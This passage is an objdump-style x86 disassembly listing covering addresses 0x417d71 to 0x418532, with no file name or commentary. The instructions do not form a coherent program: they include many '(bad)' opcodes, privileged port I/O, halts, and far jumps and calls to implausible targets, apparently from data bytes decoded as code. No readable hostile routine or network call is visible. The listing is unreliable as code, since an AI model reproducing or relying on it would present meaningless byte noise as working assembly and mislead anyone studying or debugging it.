  417d71:	or     DWORD PTR [edi+0x54],esp
  417d74:	imul   edx,DWORD PTR [eax-0x20],0xfffffff6
  417d78:	sub    dl,ah
  417d7a:	xchg   esi,eax
  417d7b:	sbb    BYTE PTR [edi],0x40
  417d7e:	xor    eax,0x3b71565e
  417d83:	outs   dx,DWORD PTR ds:[esi]
  417d84:	sbb    DWORD PTR [ebx+eax*4],edx
  417d87:	pop    ebx
  417d88:	xchg   esi,eax
  417d89:	lahf   
  417d8a:	inc    eax
  417d8b:	cs mov dh,0xa4
  417d8e:	cmc    
  417d8f:	inc    ebx
  417d90:	mov    al,0xd3
  417d92:	pop    ebp
  417d93:	mov    esi,DWORD PTR [esi]
  417d95:	sub    DWORD PTR [edi+edx*8+0x24d2adb0],edx
  417d9c:	inc    edi
  417d9d:	mov    edi,0xae7ed4ec
  417da2:	and    al,0x65
  417da4:	adc    al,0xf7
  417da6:	mov    dl,0xd0
  417da8:	in     eax,dx
  417da9:	sub    al,0x58
  417dab:	mov    ecx,0x160188c2
  417db0:	xor    dh,BYTE PTR [ecx+0x55b87c3e]
  417db6:	inc    esp
  417db7:	mov    BYTE PTR [eax-0xb26be96],dl
  417dbd:	mov    dl,0x5a
  417dbf:	lea    edx,[ebp+0x6d701d77]
  417dc5:	cmp    DWORD PTR [eax],eax
  417dc7:	aaa    
  417dc8:	lock test dh,dl
  417dcb:	jmp    0x417e1d
  417dcd:	test   al,0xd8
  417dcf:	sbb    DWORD PTR [ebp+0x2c],esi
  417dd2:	sbb    ebp,DWORD PTR [ecx+0x69]
  417dd5:	pop    edx
  417dd6:	mov    bh,0x0
  417dd8:	jge    0x417d93
  417dda:	mov    edi,DWORD PTR [ebx-0x2b]
  417ddd:	xchg   edi,eax
  417dde:	(bad)  
  417ddf:	fcomp  st(4)
  417de1:	scas   al,BYTE PTR es:[edi]
  417de2:	ficomp WORD PTR [esi]
  417de4:	js     0x417d84
  417de6:	pop    edx
  417de7:	jns    0x417e16
  417de9:	mov    DWORD PTR [ecx-0x3f],ebx
  417dec:	mov    esi,0xe52048d6
  417df1:	pop    ds
  417df2:	jmp    0xde83:0xddbded08
  417df9:	adc    DWORD PTR [edx-0x514c2ae5],edx
  417dff:	push   edi
  417e00:	stos   DWORD PTR es:[edi],eax
  417e01:	ins    DWORD PTR es:[edi],dx
  417e02:	cdq    
  417e03:	pop    esp
  417e04:	jle    0x417e2d
  417e06:	cmp    ebx,eax
  417e08:	call   0x602cf8a7
  417e0d:	fsubr  DWORD PTR [ebp+0x67c8aa4d]
  417e13:	fstp   DWORD PTR [edi+0x7d311db7]
  417e19:	xchg   ebp,eax
  417e1a:	and    al,0x68
  417e1c:	stos   BYTE PTR es:[edi],al
  417e1d:	loop   0x417dda
  417e1f:	jg     0x417ddd
  417e21:	pop    es
  417e22:	mov    dl,BYTE PTR [ebx+ebx*1]
  417e25:	mov    eax,0x5b723d30
  417e2a:	sbb    al,0x9b
  417e2c:	sbb    BYTE PTR [edi-0x1a],0x2b
  417e30:	retf   0xaf99
  417e33:	sbb    BYTE PTR [eax],0x2a
  417e36:	cwde   
  417e37:	or     BYTE PTR [eax+0x37],ch
  417e3a:	and    ecx,0x6d
  417e3d:	loope  0x417e9d
  417e3f:	jae    0x417e68
  417e41:	outs   dx,DWORD PTR ds:[esi]
  417e42:	push   ecx
  417e43:	nop
  417e44:	push   es
  417e45:	adc    al,0x66
  417e47:	xlat   BYTE PTR ds:[ebx]
  417e48:	js     0x417ebb
  417e4a:	jbe    0x417e15
  417e4c:	mov    esp,0x3dd273d5
  417e51:	push   esi
  417e52:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417e53:	pop    edi
  417e54:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417e55:	adc    bh,bh
  417e57:	xor    BYTE PTR [edi-0x41],ch
  417e5a:	in     eax,dx
  417e5b:	cs jge 0x417e4f
  417e5e:	aad    0x48
  417e60:	push   bx
  417e62:	pop    ebx
  417e63:	scas   eax,DWORD PTR es:[edi]
  417e64:	jns    0x417e9f
  417e66:	loope  0x417df4
  417e68:	cmp    eax,0xfb2070f2
  417e6d:	inc    ebp
  417e6e:	out    0xd9,eax
  417e70:	ret    0xfe51
  417e73:	cwde   
  417e74:	ss inc ebp
  417e76:	push   0x81da7350
  417e7b:	stc    
  417e7c:	add    dl,BYTE PTR fs:[ecx-0x31]
  417e80:	fistp  WORD PTR [ebx+ebx*1-0x5e7e5605]
  417e87:	mov    BYTE PTR es:[eax+0x5e],dl
  417e8b:	inc    esi
  417e8c:	adc    al,0xfd
  417e8e:	into   
  417e8f:	mov    ecx,0x75d9582
  417e94:	in     al,dx
  417e95:	loopne 0x417eff
  417e97:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417e98:	inc    eax
  417e99:	fisub  DWORD PTR [ecx]
  417e9b:	fiadd  DWORD PTR cs:[eax+ebx*8-0x7a]
  417ea0:	(bad)  
  417ea2:	sbb    DWORD PTR [ecx],ecx
  417ea4:	idiv   edx
  417ea6:	xor    al,0xd8
  417ea8:	call   0x1be04ab6
  417ead:	popf   
  417eae:	xchg   ebp,eax
  417eaf:	aam    0xd0
  417eb1:	fsubr  QWORD PTR [ebx+ecx*2]
  417eb4:	sbb    eax,0x8425c65a
  417eb9:	outs   dx,BYTE PTR ds:[esi]
  417eba:	ret    
  417ebb:	loop   0x417ed9
  417ebd:	add    edi,esp
  417ebf:	xchg   ebp,eax
  417ec0:	lea    ebx,[ebx]
  417ec2:	ss ret 0xea85
  417ec6:	jp     0x417e84
  417ec8:	adc    BYTE PTR [ebx+0x64],dl
  417ecb:	mov    ebx,0x30360824
  417ed0:	add    eax,0x42c0ade4
  417ed5:	pop    esp
  417ed6:	lods   eax,DWORD PTR ds:[esi]
  417ed7:	adc    eax,0xde98f377
  417edc:	cmp    al,0xf6
  417ede:	pop    edi
  417edf:	push   edi
  417ee0:	fistp  WORD PTR [ecx]
  417ee2:	xchg   ebx,eax
  417ee3:	adc    bh,bh
  417ee5:	aaa    
  417ee6:	sub    al,0x86
  417ee8:	cmp    eax,ecx
  417eea:	adc    eax,0x4d8c736e
  417eef:	shl    esp,1
  417ef1:	inc    ecx
  417ef2:	inc    ecx
  417ef3:	pop    ds
  417ef4:	shl    ebx,0xe1
  417ef7:	ins    DWORD PTR es:[edi],dx
  417ef8:	push   ds
  417ef9:	fsub   DWORD PTR [eax+0x7664282a]
  417eff:	and    DWORD PTR [edx],ebx
  417f01:	xchg   DWORD PTR [ebx-0x7f],edx
  417f04:	sub    ch,BYTE PTR [ecx-0x6d7efed2]
  417f0a:	inc    ebx
  417f0b:	sbb    BYTE PTR [esi-0x4fe8c9a4],dl
  417f11:	and    DWORD PTR [esi+0xfb69a73],edx
  417f17:	dec    esi
  417f18:	push   es
  417f19:	ins    BYTE PTR es:[edi],dx
  417f1a:	adc    ebx,DWORD PTR [esi]
  417f1c:	fistp  QWORD PTR [edi]
  417f1e:	dec    edi
  417f1f:	lods   al,BYTE PTR ds:[esi]
  417f20:	adc    eax,0x6d25838d
  417f25:	xchg   ecx,eax
  417f26:	in     al,0xa9
  417f28:	(bad)  
  417f29:	cmp    bh,BYTE PTR es:[edi]
  417f2c:	xor    DWORD PTR [edx+0x23],esp
  417f2f:	out    dx,al
  417f30:	pop    ebp
  417f31:	cmp    eax,0x65501283
  417f36:	stos   DWORD PTR es:[edi],eax
  417f37:	xchg   esi,eax
  417f38:	std    
  417f39:	fild   DWORD PTR [edx+edx*1-0x47c8dc9f]
  417f40:	popa   
  417f41:	jns    0x417f94
  417f43:	cwde   
  417f44:	cmp    BYTE PTR [ebx+edx*2+0x62],ch
  417f48:	xchg   esp,eax
  417f49:	ins    BYTE PTR es:[edi],dx
  417f4a:	add    esp,esi
  417f4c:	sbb    ah,bh
  417f4e:	and    al,BYTE PTR [ebx+0x12]
  417f51:	mov    ebp,0x37fb3c54
  417f56:	outs   dx,BYTE PTR ds:[esi]
  417f57:	fwait
  417f58:	adc    al,0xbc
  417f5a:	ja     0x417f01
  417f5c:	jmp    esp
  417f5e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417f5f:	scas   al,BYTE PTR es:[edi]
  417f60:	scas   eax,DWORD PTR es:[edi]
  417f61:	mov    ah,0xf
  417f63:	out    dx,al
  417f64:	mov    ds:0x3ff2f6e9,al
  417f69:	repnz cmp eax,0xd08681c8
  417f6f:	jl     0x417f60
  417f71:	add    BYTE PTR [edx-0x5],bh
  417f74:	sbb    ch,al
  417f76:	cmp    ah,BYTE PTR [esi]
  417f78:	push   es
  417f79:	das    
  417f7a:	pop    edx
  417f7b:	jb     0x417f69
  417f7d:	pop    ds
  417f7e:	popa   
  417f7f:	shr    DWORD PTR [ebp+0x49],cl
  417f82:	or     DWORD PTR [edi-0x7602b491],ecx
  417f88:	mov    al,ds:0x33f674c9
  417f8d:	mov    cl,0x50
  417f8f:	xor    ebp,DWORD PTR [esi]
  417f91:	int3   
  417f92:	and    eax,0xfb6ebd7f
  417f97:	test   al,0xb2
  417f99:	inc    esi
  417f9a:	fsub   QWORD PTR [edx+0x57]
  417f9d:	in     eax,dx
  417f9e:	data16 jbe 0x417f32
  417fa1:	adc    DWORD PTR [ebp+0x14],edx
  417fa4:	fs ret 0x6c91
  417fa8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417fa9:	fsub   DWORD PTR [edx-0x2c]
  417fac:	sbb    BYTE PTR [ecx-0x5baa1f43],0xed
  417fb3:	cs test eax,0x732155eb
  417fb9:	jnp    0x418001
  417fbb:	sub    BYTE PTR [ecx-0x45],bh
  417fbe:	add    BYTE PTR [edx-0x5d3fbed1],cl
  417fc4:	cmp    bh,al
  417fc6:	stc    
  417fc7:	lahf   
  417fc8:	ror    BYTE PTR [esp+ecx*1+0x2d],cl
  417fcc:	sbb    ebx,DWORD PTR [esi+0x17980e74]
  417fd2:	stos   DWORD PTR es:[edi],eax
  417fd3:	ja     0x417fe6
  417fd5:	sar    cl,1
  417fd7:	retf   
  417fd8:	fst    QWORD PTR [ebx+0x65]
  417fdb:	int3   
  417fdc:	xor    al,0x52
  417fde:	retf   
  417fdf:	sub    BYTE PTR [edi-0x19],0x7c
  417fe3:	and    DWORD PTR [esi+0x79ae83e7],edx
  417fe9:	mov    esi,0x8b859447
  417fee:	jmp    0x65f39367
  417ff3:	in     al,0x4
  417ff5:	cmp    edi,DWORD PTR [ecx+edi*2-0x26]
  417ff9:	lahf   
  417ffa:	inc    ebx
  417ffb:	or     ebp,DWORD PTR [ebx+0x12dfacba]
  418001:	mov    ebp,0x36a82941
  418006:	les    ebp,FWORD PTR cs:[edx-0x60]
  41800a:	dec    ebx
  41800b:	js     0x417fe4
  41800d:	imul   edx,DWORD PTR [eax],0x6a
  418010:	dec    BYTE PTR [edi+esi*8+0x5a]
  418014:	ss inc esp
  418016:	retf   0xa92d
  418019:	add    eax,0xb5b3ed6b
  41801e:	or     ah,BYTE PTR [edx-0x72e19531]
  418024:	mov    al,0x71
  418026:	pop    edx
  418027:	hlt    
  418028:	cmp    DWORD PTR [edx],esp
  41802a:	pop    eax
  41802b:	pushf  
  41802c:	mov    cl,0x66
  41802e:	or     dh,ch
  418030:	dec    ebx
  418031:	pop    edi
  418032:	mov    dl,0x2d
  418034:	out    0xf2,eax
  418036:	enter  0x70c,0xc4
  41803a:	test   eax,0x996c3c98
  41803f:	mov    al,ds:0x553342c5
  418044:	sbb    edi,DWORD PTR [ebx-0x7aacc9b1]
  41804a:	daa    
  41804b:	jno    0x41801b
  41804d:	retf   0xb101
  418050:	inc    esi
  418051:	in     al,0xd1
  418053:	and    DWORD PTR [ecx+esi*4+0x77],0xe5d38d8a
  41805b:	in     al,0x93
  41805d:	fcom   st(3)
  41805f:	adc    DWORD PTR [eax+0x3d],esi
  418062:	inc    ebp
  418063:	shr    esi,cl
  418065:	add    eax,0xd554895b
  41806a:	sub    eax,0x4d9ec180
  418070:	cli    
  418071:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418072:	stc    
  418073:	sbb    al,0x1c
  418075:	sub    ebx,ebp
  418077:	cwde   
  418078:	loope  0x418070
  41807a:	adc    DWORD PTR [ecx+0x572996d9],esp
  418080:	out    0x7d,eax
  418082:	hlt    
  418083:	iret   
  418084:	and    al,0x2f
  418086:	mov    eax,0x8c12bb4a
  41808b:	fucomi st,st(1)
  41808d:	mov    eax,0x5d8289ed
  418092:	shr    DWORD PTR [ecx],cl
  418094:	dec    ebx
  418095:	(bad)  
  418096:	mov    ah,0x1d
  418098:	add    esp,DWORD PTR [edx+0x42652705]
  41809e:	sahf   
  41809f:	addr16 push es
  4180a1:	xor    eax,0x16431c3c
  4180a6:	xchg   ecx,eax
  4180a7:	add    BYTE PTR [ebx-0x6f],dh
  4180aa:	add    dh,dl
  4180ac:	or     DWORD PTR [esi],esi
  4180ae:	test   DWORD PTR [ebx+0x78009580],eax
  4180b4:	sti    
  4180b5:	cmp    ebx,DWORD PTR [edx-0x52224bde]
  4180bb:	sub    DWORD PTR [ebx+0x40],0xd79d389d
  4180c2:	nop
  4180c3:	pop    es
  4180c4:	out    dx,al
  4180c5:	sbb    ecx,ebp
  4180c7:	outs   dx,BYTE PTR ds:[esi]
  4180c8:	adc    dh,BYTE PTR [esi+0x5f]
  4180cb:	inc    ebx
  4180cc:	enter  0x77f5,0x44
  4180d0:	push   es
  4180d1:	mov    dh,0x6f
  4180d3:	jno    0x4180df
  4180d5:	push   ss
  4180d6:	push   esi
  4180d7:	jno    0x418070
  4180d9:	cmc    
  4180da:	mov    bl,BYTE PTR [ebp-0x56]
  4180dd:	mov    edx,0x9a11831a
  4180e2:	mov    ebx,0x4be03b9e
  4180e7:	dec    edx
  4180e8:	shr    dl,0x74
  4180eb:	mov    cl,0xb5
  4180ed:	adc    bh,BYTE PTR [esi+0xd37c421]
  4180f3:	scas   al,BYTE PTR es:[edi]
  4180f4:	fld    DWORD PTR [eax+0x3f9d2c82]
  4180fa:	push   ebx
  4180fb:	pop    edi
  4180fc:	add    BYTE PTR [edi+0x7f20fe47],dh
  418102:	push   esi
  418103:	mov    bh,0xbd
  418105:	or     DWORD PTR [ecx+eiz*8-0x36],0xffffffbc
  41810a:	jmp    FWORD PTR [ebx+eax*2+0x4d]
  41810e:	aad    0xb3
  418110:	sbb    ecx,esi
  418112:	test   BYTE PTR [eax],cl
  418114:	or     eax,0xa179e7cf
  418119:	adc    DWORD PTR [edi+edi*2],esp
  41811c:	popf   
  41811d:	shl    DWORD PTR [edi-0x3f],1
  418120:	adc    BYTE PTR ds:[eax+0x25],0x89
  418125:	test   al,0xd8
  418127:	xor    bh,BYTE PTR [edx-0x5e]
  41812a:	dec    eax
  41812b:	cdq    
  41812c:	mov    bl,BYTE PTR [edx+eiz*4+0x7f]
  418130:	xchg   esp,eax
  418131:	sub    al,BYTE PTR [ecx-0x2f]
  418134:	xlat   BYTE PTR ds:[ebx]
  418135:	aam    0xc
  418137:	pop    es
  418138:	jo     0x41816f
  41813a:	ds fs push 0x6b
  41813e:	sbb    ebx,DWORD PTR [edx+0x581259a1]
  418144:	sbb    BYTE PTR [ebx],cl
  418146:	repz not BYTE PTR [esi]
  418149:	call   0x5b2f:0xf0ffb2e8
  418150:	dec    ebp
  418151:	daa    
  418152:	mov    eax,DWORD PTR [eax]
  418154:	in     al,0x95
  418156:	pop    ds
  418157:	aam    0x43
  418159:	xchg   BYTE PTR [ebx+ecx*2-0x5bba6524],dl
  418160:	mov    edx,0x85a64189
  418165:	push   ecx
  418166:	xor    bl,BYTE PTR [ecx+0x730247ce]
  41816c:	dec    edi
  41816e:	or     eax,0xef0b2ad1
  418173:	out    0x1d,eax
  418175:	(bad)  
  418176:	imul   esi,DWORD PTR [edx+eiz*4-0x76454e12],0x2ca8e78a
  418181:	adc    eax,0x4bc3a7c3
  418186:	enter  0x424e,0x74
  41818a:	fwait
  41818b:	lahf   
  41818c:	dec    ebp
  41818d:	push   cs
  41818e:	call   0x2949:0x566c99a2
  418195:	cmc    
  418196:	test   al,0xd6
  418198:	gs pop eax
  41819a:	or     BYTE PTR [ebx+0x47855105],dl
  4181a0:	adc    al,bl
  4181a2:	sbb    al,0x10
  4181a4:	loopne 0x4181bc
  4181a6:	aas    
  4181a7:	sub    DWORD PTR [eax-0x14e44733],edx
  4181ad:	cmp    eax,eax
  4181af:	push   ecx
  4181b0:	inc    eax
  4181b1:	push   0x68
  4181b3:	sbb    ecx,DWORD PTR ds:0x2162ea61
  4181b9:	and    DWORD PTR [edi-0x2],ecx
  4181bc:	sbb    cl,dh
  4181be:	loop   0x4181c8
  4181c0:	in     al,0x10
  4181c2:	idiv   edx
  4181c4:	push   edx
  4181c5:	xchg   ecx,eax
  4181c6:	xlat   BYTE PTR ds:[ebx]
  4181c7:	and    cl,BYTE PTR [eax-0x7a53e25]
  4181cd:	lds    ebx,FWORD PTR [ebx-0x18]
  4181d0:	call   0x4c65:0x58f78ff8
  4181d7:	test   eax,0x731162cc
  4181dc:	repz jle 0x41823c
  4181df:	or     dl,0x52
  4181e2:	enter  0x998,0x11
  4181e6:	or     ebx,DWORD PTR [eax+ebp*8-0xd]
  4181ea:	cmp    DWORD PTR [eax+edi*1+0x38],edx
  4181ee:	test   eax,0xf6f5aeef
  4181f3:	inc    ebp
  4181f4:	lds    edx,FWORD PTR [esi-0x3b]
  4181f7:	pushf  
  4181f8:	mov    edi,0xea94484d
  4181fd:	nop
  4181fe:	fild   QWORD PTR [eax]
  418200:	pop    es
  418201:	pop    ebx
  418203:	push   esi
  418204:	imul   ebx,DWORD PTR [ebx],0x1d
  418207:	mov    ebp,0xfc4dc934
  41820c:	fimul  DWORD PTR [edi]
  41820e:	ret    0xa750
  418211:	sbb    BYTE PTR [eax+0x646cc5d9],ch
  418217:	xor    BYTE PTR ds:0x19b90455,ah
  41821d:	jmp    0x4181de
  41821f:	jecxz  0x4181cf
  418221:	mov    BYTE PTR [edi],ah
  418223:	das    
  418224:	test   al,0x1c
  418226:	cld    
  418227:	jge    0x41824f
  418229:	sub    BYTE PTR es:[ebx],bl
  41822c:	sub    dh,BYTE PTR [ecx-0x4925bf7b]
  418232:	gs pop esp
  418234:	scas   eax,DWORD PTR es:[edi]
  418235:	mov    ss,WORD PTR [ebx+0x6b]
  418238:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418239:	mov    bl,0xc7
  41823b:	jecxz  0x4182ab
  41823d:	mov    BYTE PTR [esi+0x65cd1033],cl
  418243:	cmp    bh,BYTE PTR [ebx+ecx*1]
  418246:	dec    ebx
  418247:	inc    eax
  418248:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418249:	cmp    DWORD PTR [ebp-0x6a],ebx
  41824c:	xor    al,0xaf
  41824e:	mov    eax,ds:0xff506964
  418253:	push   eax
  418254:	cdq    
  418255:	adc    DWORD PTR [eax],esi
  418257:	rol    bl,1
  418259:	ror    ecx,1
  41825b:	call   0x8fe67e9f
  418260:	sbb    dh,BYTE PTR [edx+eiz*4+0x49d936d5]
  418267:	mov    esp,0xcd0e328
  41826c:	xchg   ebx,eax
  41826d:	sub    al,0x3
  41826f:	repnz cli 
  418271:	mov    ds,eax
  418273:	rol    DWORD PTR [ebp+0x16],cl
  418276:	aam    0x4
  418278:	and    BYTE PTR [ecx-0x263cc804],dh
  41827e:	jae    0x4182cb
  418280:	daa    
  418281:	pop    edi
  418282:	cli    
  418283:	lock or eax,0x4b2b3999
  418289:	call   0xc5931860
  41828e:	pop    eax
  41828f:	test   al,0x4e
  418291:	sbb    al,0xce
  418293:	xor    al,0xbe
  418295:	enter  0x87b,0xab
  418299:	call   0x78f6:0x854ec7d9
  4182a0:	test   al,0x79
  4182a2:	mov    eax,ds:0xaa73f34b
  4182a7:	loopne 0x418233
  4182a9:	int3   
  4182aa:	push   cs
  4182ab:	xor    al,0xf2
  4182ad:	sub    al,0x57
  4182af:	(bad)  
  4182b0:	and    DWORD PTR [eax-0x7c32f97a],edi
  4182b6:	outs   dx,DWORD PTR ds:[esi]
  4182b7:	xchg   ebx,eax
  4182b8:	adc    al,BYTE PTR [eax]
  4182ba:	repz mov bl,0xbc
  4182bd:	sar    DWORD PTR [ecx],cl
  4182bf:	ds mov bh,0x74
  4182c2:	dec    ecx
  4182c3:	mov    esi,DWORD PTR [eax-0x1f]
  4182c6:	mov    ds:0x2f0fda53,eax
  4182cb:	pop    esp
  4182cc:	leave  
  4182cd:	mov    cl,0x97
  4182cf:	push   es
  4182d0:	add    eax,0xe3abb445
  4182d5:	push   ebx
  4182d6:	pop    edx
  4182d7:	and    eax,0x1275063c
  4182dc:	in     al,dx
  4182dd:	mov    eax,ds:0xc1304be
  4182e2:	mov    edx,0x582a5ee5
  4182e7:	retf   
  4182e8:	dec    edx
  4182e9:	adc    al,0x9b
  4182eb:	push   0xfffffff4
  4182ed:	and    al,0x4f
  4182ef:	inc    eax
  4182f0:	cli    
  4182f1:	and    DWORD PTR [ebp+0x5b],eax
  4182f4:	(bad)  
  4182f5:	out    dx,eax
  4182f6:	sub    ch,dl
  4182f8:	pop    esp
  4182f9:	jns    0x4182bf
  4182fb:	sub    esi,DWORD PTR [ecx+0x3f9fe312]
  418301:	adc    BYTE PTR [esi],ah
  418303:	in     al,0x5e
  418305:	dec    esi
  418306:	mov    esp,0x4af5fcd8
  41830c:	hlt    
  41830d:	pop    esi
  41830e:	cmp    al,0xb8
  418310:	dec    edi
  418311:	jl     0x4182dc
  418313:	mov    bl,0xd8
  418315:	push   ebp
  418316:	jmp    0x4182ad
  418318:	adc    BYTE PTR [ecx],cl
  41831a:	in     eax,0xf0
  41831c:	sti    
  41831d:	in     al,0x5b
  41831f:	inc    ebp
  418320:	xchg   ebx,eax
  418321:	fwait
  418322:	or     bl,BYTE PTR [ecx]
  418324:	mov    edi,0xc22148aa
  418329:	cs out dx,al
  41832b:	mov    cl,0x33
  41832d:	push   ds
  41832e:	mov    eax,0x6a51500f
  418333:	mov    bh,BYTE PTR [ebx+0x228e8aa3]
  418339:	jge    0x4183b5
  41833b:	or     BYTE PTR [eax+0x1d],ah
  41833e:	adc    ecx,esp
  418340:	nop
  418341:	ins    BYTE PTR es:[edi],dx
  418342:	std    
  418343:	mov    edx,0xce87f9df
  418348:	push   ss
  418349:	outs   dx,DWORD PTR ds:[esi]
  41834a:	call   0xc6b4c30d
  41834f:	xor    al,0xa0
  418351:	jge    0x4182fd
  418353:	xor    al,0xa5
  418355:	push   esp
  418356:	outs   dx,DWORD PTR ds:[esi]
  418357:	out    dx,al
  418358:	mov    dh,0x41
  41835a:	adc    BYTE PTR [ebx-0x56],cl
  41835d:	adc    BYTE PTR [esp+ebx*2+0x79],bl
  418361:	pop    ecx
  418362:	scas   al,BYTE PTR es:[edi]
  418363:	pop    esi
  418364:	add    DWORD PTR [ebx],esp
  418366:	xlat   BYTE PTR ds:[ebx]
  418367:	mov    edx,0xd6ca2f7d
  41836c:	jbe    0x4183e9
  41836e:	rcr    DWORD PTR ds:0x1a9b802,cl
  418374:	(bad)  
  418375:	out    dx,al
  418376:	aaa    
  418377:	fwait
  418378:	popfw  
  41837a:	push   edi
  41837b:	push   0xffffffa7
  41837d:	cli    
  41837e:	mov    eax,ds:0x3809388e
  418383:	mov    al,0x1d
  418385:	pusha  
  418386:	clc    
  418387:	xchg   ecx,eax
  418388:	jb     0x418398
  41838a:	push   ebp
  41838b:	xchg   ebx,eax
  41838c:	push   ecx
  41838d:	(bad)  
  41838e:	jnp    0x4183e0
  418390:	mov    al,0x18
  418392:	pop    eax
  418393:	or     DWORD PTR [eax],esi
  418395:	push   esi
  418396:	push   0x2b
  418398:	mov    ebx,0x1335bf69
  41839d:	rcr    dl,0x4f
  4183a0:	fnstcw WORD PTR [edx]
  4183a2:	mov    ebp,DWORD PTR [ebp+0x12904391]
  4183a8:	inc    eax
  4183a9:	mov    cl,0xb
  4183ab:	cli    
  4183ac:	jmp    0x3e36ec90
  4183b1:	hlt    
  4183b2:	ss iret 
  4183b4:	je     0x418354
  4183b6:	cld    
  4183b7:	add    al,0xac
  4183b9:	adc    DWORD PTR [ecx],eax
  4183bb:	mov    ch,0x97
  4183bd:	xchg   esp,eax
  4183be:	xor    eax,0x7d095548
  4183c3:	sub    BYTE PTR [edi+esi*1],cl
  4183c6:	(bad)  
  4183c7:	lods   al,BYTE PTR ds:[esi]
  4183c8:	add    al,0x57
  4183ca:	cwde   
  4183cb:	loope  0x418412
  4183cd:	fcomp  QWORD PTR [esi]
  4183cf:	out    0x52,al
  4183d1:	mul    BYTE PTR [eax-0x201b2897]
  4183d7:	sbb    al,0x1f
  4183d9:	cwde   
  4183da:	sub    edi,DWORD PTR [edx+0xd]
  4183dd:	mov    dl,0xdd
  4183df:	shl    BYTE PTR [edi-0x6b],1
  4183e2:	xor    BYTE PTR [edx+0x5f3b12f8],dh
  4183e8:	dec    ebp
  4183e9:	sub    ch,bh
  4183eb:	test   BYTE PTR [esp+esi*2+0x37],dh
  4183ef:	adc    eax,0x284c3e8b
  4183f4:	in     al,dx
  4183f5:	xor    BYTE PTR [esi+ebp*1],0x16
  4183f9:	imul   DWORD PTR [eax-0x2369a667]
  4183ff:	adc    ah,BYTE PTR [edx-0x69]
  418402:	mov    WORD PTR [ebp+0x56],es
  418405:	ficomp WORD PTR [ecx+0x2b6c17cd]
  41840b:	mov    esi,0x1ea16167
  418410:	(bad)  
  418412:	(bad)  
  418413:	rcr    DWORD PTR [esi],0xe7
  418416:	jb     0x41846c
  418418:	or     ebx,DWORD PTR [ecx]
  41841a:	hlt    
  41841b:	sbb    BYTE PTR [ecx],0x7e
  41841e:	out    0x31,al
  418420:	mov    eax,0x4942ec6c
  418425:	sub    edx,ebp
  418427:	repnz das 
  418429:	xchg   edi,eax
  41842a:	xlat   BYTE PTR ds:[ebx]
  41842b:	and    al,0x3e
  41842d:	adc    BYTE PTR [edx+0x43f6a463],ah
  418433:	popf   
  418434:	in     al,0x9f
  418436:	inc    edx
  418437:	rcr    BYTE PTR ds:0xf14677d6,1
  41843d:	das    
  41843e:	sbb    bl,bl
  418440:	sti    
  418441:	sti    
  418442:	jmp    0xc313:0x4018c500
  418449:	push   ss
  41844a:	xchg   ecx,eax
  41844b:	imul   esi,DWORD PTR [ebx],0x64
  41844e:	or     eax,0xadcd628c
  418453:	or     DWORD PTR cs:[ecx-0x1fe11595],ecx
  41845a:	or     eax,0x40123850
  41845f:	mov    bh,0x5c
  418461:	nop
  418462:	loope  0x418458
  418464:	(bad)  
  418465:	idiv   BYTE PTR [ecx-0x1a]
  418468:	or     BYTE PTR [edx+0x79a58d1c],ah
  41846e:	cld    
  41846f:	ins    DWORD PTR es:[edi],dx
  418470:	mov    eax,0xf58720
  418475:	popa   
  418476:	add    ecx,DWORD PTR [ebp-0x2b]
  418479:	cwde   
  41847a:	push   eax
  41847b:	mov    dh,0x19
  41847d:	and    al,0x44
  41847f:	or     ch,BYTE PTR [eax+0x7f576e35]
  418485:	das    
  418486:	sbb    DWORD PTR [ecx+edx*1+0x3d],ebx
  41848a:	lea    ebx,[ebp-0x298a31f2]
  418490:	dec    ebp
  418491:	pop    ss
  418492:	(bad)  
  418493:	push   0x1b6ff949
  418498:	test   DWORD PTR [ebp-0x4eb5a09b],edx
  41849e:	adc    al,0xfd
  4184a0:	sub    DWORD PTR [ebx+0x6e6b7f30],ebx
  4184a6:	inc    edi
  4184a7:	leave  
  4184a8:	inc    edx
  4184a9:	push   ds
  4184aa:	mov    BYTE PTR [edx-0xc3b5d9a],bh
  4184b0:	(bad)
  4184b4:	inc    edi
  4184b5:	popa   
  4184b6:	mov    cl,0xf3
  4184b8:	into   
  4184b9:	scas   eax,DWORD PTR es:[edi]
  4184ba:	cli    
  4184bb:	xor    bh,BYTE PTR [ebp+0xd]
  4184be:	mov    es,WORD PTR [ebp-0x30c87f0]
  4184c4:	sbb    BYTE PTR [ecx-0x15],dh
  4184c7:	stc    
  4184c8:	call   0x7170:0x9f147441
  4184cf:	xchg   edi,eax
  4184d0:	iret   
  4184d1:	xchg   dl,bl
  4184d3:	or     ah,BYTE PTR [ebx]
  4184d5:	xchg   ebx,eax
  4184d6:	imul   edi,DWORD PTR [esi+edi*8-0x6c],0x3a
  4184db:	jae    0x41853e
  4184dd:	mov    ds:0xfd15223a,eax
  4184e2:	outs   dx,BYTE PTR ds:[esi]
  4184e3:	xor    edx,DWORD PTR [ebx+0x3c4d02ea]
  4184e9:	or     dl,BYTE PTR [ecx*1-0x4de4655c]
  4184f0:	ret    
  4184f1:	inc    edx
  4184f2:	leave  
  4184f3:	in     al,0x8d
  4184f5:	stos   BYTE PTR es:[edi],al
  4184f6:	rol    ch,1
  4184f8:	cmp    cl,BYTE PTR [ebp+0x46]
  4184fb:	aad    0x19
  4184fd:	push   edx
  4184fe:	push   edi
  4184ff:	dec    esi
  418500:	dec    edi
  418501:	test   BYTE PTR [esi],0x2e
  418504:	mov    BYTE PTR [ebp-0x5e],ch
  418507:	and    BYTE PTR [edi],dh
  418509:	inc    esi
  41850a:	mov    ds:0x19e3cfd5,al
  41850f:	nop
  418510:	jle    0x418567
  418512:	shl    BYTE PTR [edi],1
  418514:	push   eax
  418515:	xor    BYTE PTR [eax],bh
  418517:	xlat   BYTE PTR ds:[ebx]
  418518:	dec    ebx
  418519:	push   0x6d
  41851b:	push   ebp
  41851c:	jmp    0x50557108
  418521:	dec    edi
  418522:	test   eax,ebx
  418524:	(bad)  
  418525:	cli    
  418526:	lods   eax,DWORD PTR ds:[esi]
  418527:	add    ecx,DWORD PTR [edi+eax*2+0x40]
  41852b:	sbb    eax,0x11a1c544
  418530:	sub    ch,bl
  418532:	jge    0x41852d
